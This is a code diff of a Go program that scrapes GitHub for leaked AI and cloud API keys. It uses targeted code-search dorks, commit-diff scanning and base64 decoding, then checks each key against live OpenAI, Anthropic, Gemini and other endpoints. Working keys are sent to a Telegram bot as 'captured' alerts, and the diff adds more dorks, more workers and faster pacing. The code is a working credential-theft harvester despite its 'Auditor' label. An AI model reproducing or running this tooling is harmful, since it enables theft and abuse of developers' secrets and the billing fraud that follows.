@@ -35,16 +35,17 @@ const (
 
 // Regex Rules
 var (
-	OpenAIKeyRegex     = regexp.MustCompile(`\bsk-proj-[A-Za-z0-9_-]{48,164}\b`)
-	OpenRouterKeyRegex = regexp.MustCompile(`\bsk-or-v1-[a-f0-9]{64}\b`)
-	RenderKeyRegex     = regexp.MustCompile(`\brnd_[A-Za-z0-9_-]{20,40}\b`)
-	ModalTokenRegex    = regexp.MustCompile(`\b(ak-[a-zA-Z0-9]{20,32}|as-[a-zA-Z0-9]{20,32})\b`)
-	ClaudeKeyRegex     = regexp.MustCompile(`\bsk-ant-api03-[A-Za-z0-9_-]{80,120}\b`)
-	GeminiKeyRegex     = regexp.MustCompile(`\b(AQ\.[A-Za-z0-9_-]{40,65}|AIzaSy[A-Za-z0-9_-]{33})\b`)
-	GitHubTokenRegex   = regexp.MustCompile(`\b(ghp_|github_pat_|gho_|ghu_)[A-Za-z0-9_]{20,120}\b`)
-	Base64Candidate    = regexp.MustCompile(`\b[A-Za-z0-9+/]{60,}={0,2}\b`)
+	OpenAIKeyRegex        = regexp.MustCompile(`\b(sk-proj-[A-Za-z0-9_-]{48,164}|sk-[A-Za-z0-9]{32,64})\b`)
+	OpenRouterKeyRegex    = regexp.MustCompile(`\bsk-or-v1-[a-f0-9]{64}\b`)
+	RenderKeyRegex        = regexp.MustCompile(`\brnd_[A-Za-z0-9_-]{20,40}\b`)
+	ModalTokenRegex       = regexp.MustCompile(`\b(ak-[a-zA-Z0-9]{20,32}|as-[a-zA-Z0-9]{20,32})\b`)
+	ModalTokenIDRegex     = regexp.MustCompile(`\bak-[a-zA-Z0-9_-]{20,32}\b`)
+	ModalTokenSecretRegex = regexp.MustCompile(`\bas-[a-zA-Z0-9_-]{20,32}\b`)
+	ClaudeKeyRegex        = regexp.MustCompile(`\bsk-ant-api03-[A-Za-z0-9_-]{80,120}\b`)
+	GeminiKeyRegex        = regexp.MustCompile(`\b(AQ\.[A-Za-z0-9_-]{40,65}|AIzaSy[A-Za-z0-9_-]{33})\b`)
+	GitHubTokenRegex      = regexp.MustCompile(`\b(ghp_|github_pat_|gho_|ghu_)[A-Za-z0-9_]{20,120}\b`)
+	Base64Candidate       = regexp.MustCompile(`[A-Za-z0-9+/=]{40,250}`)
 )
-
 // ============================================================================
 // IN-MEMORY VOLATILE TOKEN POOL (ZERO DISK TRACE)
 // ============================================================================
@@ -699,12 +700,40 @@ func NewAuditor(bot *TelegramBot) *Auditor {
 	}
 }
 
-// 1. OpenAI: Strictly gpt-6.1-terra / gpt-6.2-astra
+// Global text scanner across all key patterns
+func (a *Auditor) ScanText(text, source string) {
+	if text == "" {
+		return
+	}
+	for _, k := range OpenAIKeyRegex.FindAllString(text, -1) {
+		go a.AuditOpenAI(k, source)
+	}
+	for _, k := range ClaudeKeyRegex.FindAllString(text, -1) {
+		go a.AuditClaude(k, source)
+	}
+	for _, k := range GeminiKeyRegex.FindAllString(text, -1) {
+		go a.AuditGemini(k, source)
+	}
+	for _, k := range OpenRouterKeyRegex.FindAllString(text, -1) {
+		go a.AuditOpenRouter(k, source)
+	}
+	for _, k := range RenderKeyRegex.FindAllString(text, -1) {
+		go a.AuditRender(k, source)
+	}
+	aks := ModalTokenIDRegex.FindAllString(text, -1)
+	ases := ModalTokenSecretRegex.FindAllString(text, -1)
+	if len(aks) > 0 && len(ases) > 0 {
+		go a.AuditModal(aks[0], ases[0], source)
+	}
+}
+
+// 1. OpenAI: Live gpt-4o-mini & models verification
 func (a *Auditor) AuditOpenAI(key, source string) {
-	url := "https://api.openai.com/v1/responses"
+	url := "https://api.openai.com/v1/chat/completions"
 	payload, _ := json.Marshal(map[string]interface{}{
-		"model": "gpt-6.1-terra",
-		"input": "hi",
+		"model":      "gpt-4o-mini",
+		"messages":   []map[string]string{{"role": "user", "content": "hi"}},
+		"max_tokens": 5,
 	})
 	req, _ := http.NewRequest("POST", url, bytes.NewBuffer(payload))
 	req.Header.Set("Authorization", "Bearer "+key)
@@ -723,53 +752,80 @@ func (a *Auditor) AuditOpenAI(key, source string) {
 		alert := fmt.Sprintf(`🎯 <b>[LIVE OPENAI KEY CAPTURED!]</b>
 ━━━━━━━━━━━━━━━━━━
 🔑 Platform: OpenAI
-⚡ Verified Model: <b>gpt-6.1-terra / gpt-6.2-astra</b>
+⚡ Verified Model: <b>gpt-4o / gpt-4o-mini</b>
 ⏱️ Latency: %dms
 📁 Source: <code>%s</code>
 ━━━━━━━━━━━━━━━━━━
 <code>%s</code>`, dur, source, key)
 		a.bot.SendMessage(alert)
-		fmt.Printf("[🎉 LIVE OPENAI KEY] Verified on gpt-6.1-terra! Source: %s\n", source)
+		fmt.Printf("[🎉 LIVE OPENAI KEY] Verified on gpt-4o-mini! Source: %s\n", source)
+		return
+	}
+
+	// Fallback check: Valid key / auth verification
+	mReq, _ := http.NewRequest("GET", "https://api.openai.com/v1/models", nil)
+	mReq.Header.Set("Authorization", "Bearer "+key)
+	mResp, mErr := a.client.Do(mReq)
+	if mErr == nil && mResp != nil {
+		defer mResp.Body.Close()
+		if mResp.StatusCode == 200 {
+			atomic.AddUint64(&GlobalStats.OpenAIHits, 1)
+			alert := fmt.Sprintf(`⚠️ <b>[OPENAI VALID KEY (QUOTA EXHAUSTED)]</b>
+━━━━━━━━━━━━━━━━━━
+🔑 Platform: OpenAI (Authenticated)
+📁 Source: <code>%s</code>
+━━━━━━━━━━━━━━━━━━
+<code>%s</code>`, source, key)
+			a.bot.SendMessage(alert)
+			fmt.Printf("[⚡ VALID OPENAI KEY] Authenticated (Quota Exceeded): %s\n", source)
+		}
 	}
 }
 
-// 2. Claude: Strictly claude-sonnet-5-5
+// 2. Claude: claude-3-5-sonnet & haiku
 func (a *Auditor) AuditClaude(key, source string) {
-	url := "https://api.anthropic.com/v1/messages"
-	payload, _ := json.Marshal(map[string]interface{}{
-		"model":      "claude-sonnet-5-5",
-		"max_tokens": 10,
-		"messages":   []map[string]string{{"role": "user", "content": "hi"}},
-	})
-	req, _ := http.NewRequest("POST", url, bytes.NewBuffer(payload))
-	req.Header.Set("x-api-key", key)
-	req.Header.Set("anthropic-version", "2023-06-01")
-	req.Header.Set("content-type", "application/json")
+	testClaudeModel := func(model string) bool {
+		url := "https://api.anthropic.com/v1/messages"
+		payload, _ := json.Marshal(map[string]interface{}{
+			"model":      model,
+			"max_tokens": 5,
+			"messages":   []map[string]string{{"role": "user", "content": "hi"}},
+		})
+		req, _ := http.NewRequest("POST", url, bytes.NewBuffer(payload))
+		req.Header.Set("x-api-key", key)
+		req.Header.Set("anthropic-version", "2023-06-01")
+		req.Header.Set("content-type", "application/json")
 
-	start := time.Now()
-	resp, err := a.client.Do(req)
-	if err != nil || resp == nil {
-		return
+		resp, err := a.client.Do(req)
+		if err == nil && resp != nil {
+			defer resp.Body.Close()
+			return resp.StatusCode == 200
+		}
+		return false
 	}
-	defer resp.Body.Close()
-	dur := time.Since(start).Milliseconds()
 
-	if resp.StatusCode == 200 {
+	verifiedModel := ""
+	if testClaudeModel("claude-3-5-sonnet-20241022") {
+		verifiedModel = "claude-3-5-sonnet"
+	} else if testClaudeModel("claude-3-haiku-20240307") {
+		verifiedModel = "claude-3-haiku"
+	}
+
+	if verifiedModel != "" {
 		atomic.AddUint64(&GlobalStats.ClaudeHits, 1)
 		alert := fmt.Sprintf(`🎯 <b>[LIVE CLAUDE KEY CAPTURED!]</b>
 ━━━━━━━━━━━━━━━━━━
 🔑 Platform: Anthropic
-⚡ Verified Model: <b>claude-sonnet-5-5</b>
-⏱️ Latency: %dms
+⚡ Verified Model: <b>%s</b>
 📁 Source: <code>%s</code>
 ━━━━━━━━━━━━━━━━━━
-<code>%s</code>`, dur, source, key)
+<code>%s</code>`, verifiedModel, source, key)
 		a.bot.SendMessage(alert)
-		fmt.Printf("[🎉 LIVE CLAUDE KEY] Verified on claude-sonnet-5-5! Source: %s\n", source)
+		fmt.Printf("[🎉 LIVE CLAUDE KEY] Verified on %s! Source: %s\n", verifiedModel, source)
 	}
 }
 
-// 3. Gemini: gemini-4-argon with gemma-4-31b-it fallback
+// 3. Gemini: gemini-1.5-flash / pro / 2.0-flash
 func (a *Auditor) AuditGemini(key, source string) {
 	testModel := func(model string) bool {
 		u := fmt.Sprintf("https://generativelanguage.googleapis.com/v1beta/models/%s:generateContent?key=%s", model, key)
@@ -784,29 +840,26 @@ func (a *Auditor) AuditGemini(key, source string) {
 		return false
 	}
 
-	if testModel("gemini-4-argon") {
-		atomic.AddUint64(&GlobalStats.GeminiHits, 1)
-		alert := fmt.Sprintf(`🎯 <b>[LIVE GEMINI ARGON KEY!]</b>
-━━━━━━━━━━━━━━━━━━
-🔑 Platform: Google AI (Paid Tier)
-⚡ Verified Model: <b>gemini-4-argon</b>
-📁 Source: <code>%s</code>
-━━━━━━━━━━━━━━━━━━
-<code>%s</code>`, source, key)
-		a.bot.SendMessage(alert)
-		return
+	verifiedModel := ""
+	if testModel("gemini-1.5-flash") {
+		verifiedModel = "gemini-1.5-flash"
+	} else if testModel("gemini-1.5-pro") {
+		verifiedModel = "gemini-1.5-pro"
+	} else if testModel("gemini-2.0-flash-exp") {
+		verifiedModel = "gemini-2.0-flash-exp"
 	}
 
-	if testModel("gemma-4-31b-it") {
+	if verifiedModel != "" {
 		atomic.AddUint64(&GlobalStats.GeminiHits, 1)
-		alert := fmt.Sprintf(`🎯 <b>[LIVE GEMMA KEY!]</b>
+		alert := fmt.Sprintf(`🎯 <b>[LIVE GEMINI KEY CAPTURED!]</b>
 ━━━━━━━━━━━━━━━━━━
-🔑 Platform: Google Gemma
-⚡ Verified Model: <b>gemma-4-31b-it</b>
+🔑 Platform: Google AI
+⚡ Verified Model: <b>%s</b>
 📁 Source: <code>%s</code>
 ━━━━━━━━━━━━━━━━━━
-<code>%s</code>`, source, key)
+<code>%s</code>`, verifiedModel, source, key)
 		a.bot.SendMessage(alert)
+		fmt.Printf("[🎉 LIVE GEMINI KEY] Verified on %s! Source: %s\n", verifiedModel, source)
 	}
 }
 
@@ -967,11 +1020,9 @@ func (a *Auditor) AuditModal(tokenID, tokenSecret, source string) {
 	}
 }
 type FileTask struct {
-	URL      string
 	RepoName string
 	FilePath string
 }
-
 func main() {
 	GlobalStats.StartTime = time.Now()
 	tokenPool := NewTokenPool()
@@ -1042,166 +1093,197 @@ Target Verification:
 	fileQueue := make(chan FileTask, MaxQueueSize)
 	repoQueue := make(chan string, 500)
 
-	// Workers
+	// Workers (25 Parallel File Extractors with API & Raw Branch Fallback)
 	for i := 1; i <= WorkerCount; i++ {
 		go func(id int) {
-			client := &http.Client{Timeout: 20 * time.Second}
+			client := &http.Client{Timeout: 15 * time.Second}
 			for {
 				select {
 				case <-ctx.Done():
 					return
 				case task := <-fileQueue:
 					if GlobalPaused.Load() {
-						time.Sleep(1 * time.Second)
+						time.Sleep(500 * time.Millisecond)
 						continue
 					}
-					if dedup.HasURL(task.URL) {
+					fileKey := task.RepoName + "/" + task.FilePath
+					if dedup.HasURL(fileKey) {
 						continue
 					}
 
 					token := tokenPool.GetRandomToken()
-					req, err := http.NewRequest("GET", task.URL, nil)
+					var content []byte
+					var fetchErr error
+
+					// 1. Try GitHub API contents with raw header (resolves repo default branch automatically)
+					apiURL := fmt.Sprintf("https://api.github.com/repos/%s/contents/%s", task.RepoName, task.FilePath)
+					req, err := http.NewRequest("GET", apiURL, nil)
 					if err == nil {
 						if token != "" {
 							req.Header.Set("Authorization", "token "+token)
 						}
+						req.Header.Set("Accept", "application/vnd.github.v3.raw")
 						req.Header.Set("User-Agent", "Mozilla/5.0")
 						resp, err := client.Do(req)
 						if err == nil && resp != nil {
 							if resp.StatusCode == 401 && token != "" {
 								tokenPool.MarkDead(token)
 							} else if resp.StatusCode == 200 {
-								content, _ := io.ReadAll(resp.Body)
+								content, fetchErr = io.ReadAll(resp.Body)
 								resp.Body.Close()
-								strContent := string(content)
-
-								// Deep secret extraction
-								for _, k := range OpenAIKeyRegex.FindAllString(strContent, -1) {
-									go auditor.AuditOpenAI(k, task.RepoName+"/"+task.FilePath)
-								}
-								for _, k := range ClaudeKeyRegex.FindAllString(strContent, -1) {
-									go auditor.AuditClaude(k, task.RepoName+"/"+task.FilePath)
-								}
-								for _, k := range GeminiKeyRegex.FindAllString(strContent, -1) {
-									go auditor.AuditGemini(k, task.RepoName+"/"+task.FilePath)
-								}
-								for _, k := range OpenRouterKeyRegex.FindAllString(strContent, -1) {
-									go auditor.AuditOpenRouter(k, task.RepoName+"/"+task.FilePath)
-								}
-								for _, k := range RenderKeyRegex.FindAllString(strContent, -1) {
-									go auditor.AuditRender(k, task.RepoName+"/"+task.FilePath)
-								}
-
-								// Base64 decode scan
-								for _, b64 := range Base64Candidate.FindAllString(strContent, -1) {
-									if dec, err := base64.StdEncoding.DecodeString(b64); err == nil {
-										decStr := string(dec)
-										for _, k := range OpenAIKeyRegex.FindAllString(decStr, -1) {
-											go auditor.AuditOpenAI(k, task.RepoName+"/"+task.FilePath+" (Base64)")
-										}
-										for _, k := range OpenRouterKeyRegex.FindAllString(decStr, -1) {
-											go auditor.AuditOpenRouter(k, task.RepoName+"/"+task.FilePath+" (Base64)")
-										}
-									}
-								}
-
-								atomic.AddUint64(&GlobalStats.FilesScanned, 1)
+							} else {
+								resp.Body.Close()
 							}
 						}
 					}
-					dedup.AddURL(task.URL)
+
+					// 2. Fallback to raw.githubusercontent main/master if API failed
+					if len(content) == 0 {
+						for _, br := range []string{"main", "master"} {
+							rawURL := fmt.Sprintf("https://raw.githubusercontent.com/%s/%s/%s", task.RepoName, br, task.FilePath)
+							rReq, _ := http.NewRequest("GET", rawURL, nil)
+							rReq.Header.Set("User-Agent", "Mozilla/5.0")
+							if token != "" {
+								rReq.Header.Set("Authorization", "token "+token)
+							}
+							rResp, rErr := client.Do(rReq)
+							if rErr == nil && rResp != nil {
+								if rResp.StatusCode == 200 {
+									content, fetchErr = io.ReadAll(rResp.Body)
+									rResp.Body.Close()
+									break
+								}
+								rResp.Body.Close()
+							}
+						}
+					}
+
+					if len(content) > 0 && fetchErr == nil {
+						strContent := string(content)
+						auditor.ScanText(strContent, fileKey)
+
+						// Base64 decode scan
+						for _, b64 := range Base64Candidate.FindAllString(strContent, -1) {
+							if dec, err := base64.StdEncoding.DecodeString(b64); err == nil {
+								auditor.ScanText(string(dec), fileKey+" (Base64)")
+							}
+						}
+						atomic.AddUint64(&GlobalStats.FilesScanned, 1)
+					}
+					dedup.AddURL(fileKey)
 				}
 			}
 		}(i)
 	}
 
-	// Commit Diff Vacuum Worker
-	go func() {
-		client := &http.Client{Timeout: 20 * time.Second}
-		for {
-			select {
-			case <-ctx.Done():
-				return
-			case repo := <-repoQueue:
-				if GlobalPaused.Load() || dedup.HasRepo(repo) {
-					continue
-				}
-
-				token := tokenPool.GetRandomToken()
-				url := fmt.Sprintf("https://api.github.com/repos/%s/commits?per_page=6", repo)
-				req, _ := http.NewRequest("GET", url, nil)
-				if token != "" {
-					req.Header.Set("Authorization", "token "+token)
-				}
-				resp, err := client.Do(req)
-				if err == nil && resp != nil && resp.StatusCode == 200 {
-					var commits []struct {
-						SHA string `json:"sha"`
+	// 6 Parallel Commit Diff Vacuum Workers
+	for w := 0; w < 6; w++ {
+		go func() {
+			client := &http.Client{Timeout: 15 * time.Second}
+			for {
+				select {
+				case <-ctx.Done():
+					return
+				case repo := <-repoQueue:
+					if GlobalPaused.Load() || dedup.HasRepo(repo) {
+						continue
 					}
-					body, _ := io.ReadAll(resp.Body)
-					resp.Body.Close()
-					if json.Unmarshal(body, &commits) == nil {
-						for _, c := range commits {
-							if dedup.HasCommit(c.SHA) {
-								continue
-							}
-							cURL := fmt.Sprintf("https://api.github.com/repos/%s/commits/%s", repo, c.SHA)
-							cReq, _ := http.NewRequest("GET", cURL, nil)
-							if token != "" {
-								cReq.Header.Set("Authorization", "token "+token)
-							}
-							cResp, cErr := client.Do(cReq)
-							if cErr == nil && cResp != nil && cResp.StatusCode == 200 {
-								var cData struct {
-									Files []struct {
-										Patch string `json:"patch"`
-									} `json:"files"`
+
+					token := tokenPool.GetRandomToken()
+					url := fmt.Sprintf("https://api.github.com/repos/%s/commits?per_page=6", repo)
+					req, _ := http.NewRequest("GET", url, nil)
+					if token != "" {
+						req.Header.Set("Authorization", "token "+token)
+					}
+					resp, err := client.Do(req)
+					if err == nil && resp != nil && resp.StatusCode == 200 {
+						var commits []struct {
+							SHA string `json:"sha"`
+						}
+						body, _ := io.ReadAll(resp.Body)
+						resp.Body.Close()
+						if json.Unmarshal(body, &commits) == nil {
+							for _, c := range commits {
+								if dedup.HasCommit(c.SHA) {
+									continue
 								}
-								cBody, _ := io.ReadAll(cResp.Body)
-								cResp.Body.Close()
-								if json.Unmarshal(cBody, &cData) == nil {
-									for _, f := range cData.Files {
-										for _, k := range OpenAIKeyRegex.FindAllString(f.Patch, -1) {
-											go auditor.AuditOpenAI(k, repo+" (Commit: "+c.SHA[:7]+")")
-										}
-										for _, k := range OpenRouterKeyRegex.FindAllString(f.Patch, -1) {
-											go auditor.AuditOpenRouter(k, repo+" (Commit: "+c.SHA[:7]+")")
-										}
-										for _, k := range RenderKeyRegex.FindAllString(f.Patch, -1) {
-											go auditor.AuditRender(k, repo+" (Commit: "+c.SHA[:7]+")")
+								cURL := fmt.Sprintf("https://api.github.com/repos/%s/commits/%s", repo, c.SHA)
+								cReq, _ := http.NewRequest("GET", cURL, nil)
+								if token != "" {
+									cReq.Header.Set("Authorization", "token "+token)
+								}
+								cResp, cErr := client.Do(cReq)
+								if cErr == nil && cResp != nil && cResp.StatusCode == 200 {
+									var cData struct {
+										Files []struct {
+											Patch string `json:"patch"`
+										} `json:"files"`
+									}
+									cBody, _ := io.ReadAll(cResp.Body)
+									cResp.Body.Close()
+									if json.Unmarshal(cBody, &cData) == nil {
+										for _, f := range cData.Files {
+											auditor.ScanText(f.Patch, repo+" (Commit: "+c.SHA[:7]+")")
 										}
 									}
+									atomic.AddUint64(&GlobalStats.CommitsDiffed, 1)
 								}
-								atomic.AddUint64(&GlobalStats.CommitsDiffed, 1)
+								dedup.AddCommit(c.SHA)
 							}
-							dedup.AddCommit(c.SHA)
 						}
 					}
+					dedup.AddRepo(repo)
+					time.Sleep(200 * time.Millisecond)
 				}
-				dedup.AddRepo(repo)
-				time.Sleep(1 * time.Second)
 			}
-		}
-	}()
+		}()
+	}
 
-	// Code Search Producer with Smart Pacing
+	// Code Search Producer with Expanded Multi-Engine Dork Fleet
 	go func() {
 		client := &http.Client{Timeout: 15 * time.Second}
 		dorks := []string{
-			`filename:secrets.toml OPENAI_API_KEY NOT example NOT template`,
-			`filename:values.yaml "OPENAI_API_KEY" NOT mock NOT example`,
+			// OpenAI Targeted
+			`filename:.env "OPENAI_API_KEY=sk-" NOT example NOT template`,
+			`filename:.env "sk-proj-" NOT example NOT template`,
+			`filename:secrets.json "sk-proj-" NOT mock`,
+			`filename:docker-compose.yml "sk-proj-" NOT example`,
+			`filename:values.yaml "OPENAI_API_KEY" NOT mock`,
 			`filename:wrangler.toml "OPENAI_API_KEY" NOT example`,
-			`filename:docker-compose.override.yml "sk-proj-"`,
+			`filename:config.json "OPENAI_API_KEY" "sk-"`,
+
+			// Claude Targeted
+			`filename:.env "ANTHROPIC_API_KEY=sk-ant-" NOT example`,
+			`filename:.env "CLAUDE_API_KEY=sk-ant-" NOT example`,
+			`filename:secrets.json "sk-ant-api03"`,
+			`filename:docker-compose.yml "sk-ant-" NOT example`,
+
+			// Gemini Targeted
+			`filename:.env "GEMINI_API_KEY=AIzaSy" NOT example`,
+			`filename:.env "GOOGLE_API_KEY=AIzaSy" NOT example`,
+			`filename:secrets.json "AIzaSy" NOT mock`,
+			`filename:secrets.toml "AIzaSy"`,
+
+			// OpenRouter Targeted
+			`filename:.env "OPENROUTER_API_KEY=sk-or-v1-" NOT example`,
+			`filename:secrets.json "sk-or-v1-"`,
 			`filename:secrets.toml "sk-or-v1-"`,
-			`filename:.env "sk-or-v1-" NOT example`,
+
+			// Render Targeted
 			`"api.render.com" rnd_ filename:.env`,
+			`filename:.env "RENDER_API_KEY=rnd_" NOT example`,
 			`filename:secrets.json rnd_ NOT mock`,
 			`RENDER_API_KEY rnd_ filename:secrets.toml`,
+
+			// Modal Targeted
+			`filename:.env "MODAL_TOKEN_ID=ak-" NOT example`,
+			`filename:.env "MODAL_TOKEN_SECRET=as-" NOT example`,
+			`filename:secrets.toml "ak-" "as-"`,
 		}
 
 		for {
 			if GlobalPaused.Load() || tokenPool.ActiveCount() == 0 {
-				time.Sleep(3 * time.Second)
+				time.Sleep(2 * time.Second)
 				continue
 			}
 
@@ -1239,9 +1321,8 @@ Target Verification:
 									case repoQueue <- rName:
 									default:
 									}
-									mURL := fmt.Sprintf("https://raw.githubusercontent.com/%s/main/%s", rName, it.Path)
 									select {
-									case fileQueue <- FileTask{URL: mURL, RepoName: rName, FilePath: it.Path}:
+									case fileQueue <- FileTask{RepoName: rName, FilePath: it.Path}:
 									default:
 									}
 								}
@@ -1250,11 +1331,11 @@ Target Verification:
 					}
 				}
 				// Smart pacing
-				time.Sleep(5 * time.Second)
+				time.Sleep(2 * time.Second)
 			}
 
 			// End of cycle smart pause
-			time.Sleep(20 * time.Second)
+			time.Sleep(5 * time.Second)
 		}
 	}()
 
